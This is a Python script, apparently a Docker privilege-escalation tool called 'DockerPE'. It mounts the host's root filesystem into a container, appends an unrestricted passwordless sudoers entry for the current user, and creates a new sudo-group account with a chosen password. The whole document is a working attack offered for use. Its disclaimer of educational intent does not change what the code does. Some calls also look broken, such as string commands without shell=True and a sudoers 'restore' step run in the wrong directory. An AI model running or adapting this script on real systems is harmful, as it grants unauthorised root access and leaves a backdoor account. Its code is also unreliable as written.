import subprocess
import argparse

# This script was intended for ethical and educational purposes only.
# The author does not promote or endorse any illegal use of this tool and is not responsible for any misuse or any damages caused by it.

def main():

    parser = argparse.ArgumentParser(description="DockerPE")

    parser.add_argument("--user")
    parser.add_argument("--newuser")
    parser.add_argument("--newpass")

    args = parser.parse_args()

    Kuser = args.user
    Nuser = args.newuser
    NuserPasswd = args.newpass

    if not Kuser:
        Kuser = input("Current user: ")

    if not Nuser:
        Nuser = input("New user: ")

    if not NuserPasswd:
        NuserPasswd = input("New password: ")

    tmpHash = subprocess.run(
    ["openssl", "passwd", "-6", NuserPasswd],
    capture_output=True,
    text=True
    )
    HashedNuserPasswd = tmpHash.stdout.strip()

    subprocess.run(f'''docker run --rm -i -v /:/mnt alpine chroot /mnt /bin/sh -c 'cd /etc && cp ./sudoers ./sudoers.tmp && echo "{Kuser} ALL=(ALL) NOPASSWD: ALL" >> sudoers' ''')

    subprocess.run(f"sudo useradd -m {Nuser}")
    subprocess.run(f"sudo usermod -p {HashedNuserPasswd} {Nuser}")
    subprocess.run(f"sudo usermod -aG sudo {Nuser}")

    subprocess.run("cp ./sudoers.tmp ./sudoers")
    subprocess.run(f"su {Nuser}")

if __name__ == "__main__":
    main()